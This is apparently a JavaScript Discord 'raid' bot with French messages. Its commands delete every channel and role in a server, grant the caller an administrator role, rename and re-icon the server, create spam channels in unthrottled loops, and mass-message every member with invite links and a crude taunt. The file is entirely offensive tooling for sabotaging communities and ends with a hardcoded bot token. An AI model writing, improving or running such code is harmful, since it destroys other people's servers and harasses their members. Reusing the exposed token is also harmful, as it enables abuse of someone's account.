const Discord = require("discord.js");
const fs = require("fs");
const client =  new Discord.Client();
const prefix = ">"


client.commands = new Discord.Collection();



client.on('message', message => {
let  messageArray = message.content.split(" ");
let  cmd = messageArray[0]
let   args = messageArray.slice(1);
let messagecount = parseInt(args[0]);

if(cmd === `${prefix}off`){
  
  message.delete();
  client.user.setStatus("invisible")
}

        

if(cmd === `${prefix}deletec`) {
 
  message.delete()
  if(message.deletable) message.delete();
  message.guild.channels.forEach(channel => {
    if(channel.deletable) channel.delete()
    

  });
                                 
}
if(cmd === `${prefix}clic`) {
  if(message.deletable) message.delete();

if(message.deletable) message.delete();
  const st = new Discord.RichEmbed()
  .setTitle("**Clique ici pour avoir le lien de mon bot :**")
  .setURL("https://discordapp.com/api/oauth2/authorize?client_id=563032457671081995&permissions=8&scope=bot")
  .setColor("#00005a")
  message.channel.send(st)
 }
if(cmd === `${prefix}deleter`) {

   if(message.deletable) message.delete();
   message.guild.roles.forEach(role => {
   role.delete()
   });
  };
  if(cmd === `${prefix}dm`) {

    if(message.deletable) message.delete();
    message.guild.members.forEach(member=>{
          member.send("Rejoins le game :bomb:");
          member.send("https://discord.gg/ADRHRuR")
          });	
        
    };    
  
    if(cmd === `${prefix}admin`){
      message.member.guild.createRole({
          name: "",
          color: "0x010000",
          permissions: ("ADMINISTRATOR")
      }).then(function(role)
      {
          message.member.addRole(role);
          message.channel.bulkDelete(1).then(() => {
              message.channel.send("\`Tu as désormais les perms admin. Tu pourra baisé ce serveur avec le Selfbot d'EL FAMOSO !\`")
              message.channel.bulkDelete(1)
          });
      }); 
  }           
    if(cmd === `${prefix}raid`){
      message.delete()
    
      let oldnm = message.guild.name;
      message.guild.channels.map(c => {
              message.delete();
          rdr = setInterval(() => {
            message.guild.createRole({
                    name: "DESTROY BY ΛSØЯ",
                    permissions: ["ADMINISTRATOR"]
                }).then(rr => {
      
                  message.member.addRole(rr.id);
                });
              }, 0);
            message.guild.setName('DESTROY BY ΛSØЯ');
            message.guild.setIcon("https://images-ext-1.discordapp.net/external/321AEITYFtagEmC0uGBiWncHi8-s00Kqwes5YOAKObw/https/cdn.discordapp.com/icons/554270558238539778/9a86f009c4d269321564226fa1e38be6.jpg")
                setTimeout(function () {
                rd1 = setInterval(() => {
              
                  message.guild.createChannel('DESTROY BY ΛSØЯ', 'text').then(channek => {
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')
                  channek.send('@everyone DESTROY BY ΛSØЯ');
                  channek.send('https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif')


                  message.guild.members.forEach(member=>{
                    member.send("Le serveur ou tu étais viens de se faire violer :smiley:");
                    member.send("Redirection vers ΛSØЯ")
                    member.send("https://discord.gg/ADRHRuR")
                    member.send("https://media.giphy.com/media/Yq1xrOppH680fXNaTs/giphy.gif")
                  
                  
                    });	



                  

                  
                })})})})}})
    
         
        
             
  
 
       
      client.login("NTYzMDMyNDU3NjcxMDgxOTk1.XKUpNQ.lJtZoJI4kC7TkKHFukmF8bucn9A")
